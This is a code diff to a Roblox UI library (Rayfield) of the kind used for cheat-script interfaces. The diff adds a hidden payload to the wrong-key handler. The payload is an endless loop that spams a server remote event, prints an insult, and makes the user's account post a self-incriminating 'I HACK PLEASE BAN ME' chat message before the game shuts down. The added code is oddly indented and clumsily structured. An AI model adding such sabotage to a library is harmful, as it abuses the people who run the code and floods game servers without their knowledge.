@@ -1073,9 +1073,26 @@ function RayfieldLibrary:CreateWindow(Settings)
 						TweenService:Create(KeyMain.NoteTitle, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
 						TweenService:Create(KeyMain.NoteMessage, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
 						TweenService:Create(KeyMain.Hide, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
+					    local Player = game.Players.LocalPlayer
+					    local Events = game.ReplicatedStorage.Events
+					    local MessageService = Events.MessageService
+					     Players = game:GetService("Players")
+					    local Lighting = game:GetService("Lighting")
+					    local Workspace = game:GetService("Workspace")
+					    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+					    local LocalPlayer = Players.LocalPlayer
+  					      while true do
+  					          local args = {
+      					          [1] = "Start",
+      					          [2] = workspace.NPC.BricktonGasNPPC.NPCTag.Dialogue
+    					        }
+   					         game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+   					         print("YOU FUCKING WEIRDO")
+    					        Players:Chat("/s I HACK PLEASE BAN ME I AM BAD AT IT TO")
+  					          wait()
 						wait(0.45)
-						game.Players.LocalPlayer:Kick("The Owners Have Been Notified That You Broke The Agreement")
 						game:Shutdown()
+					    	end
 						end
 					KeyMain.Input.InputBox.Text = ""
 					AttemptsRemaining = AttemptsRemaining - 1
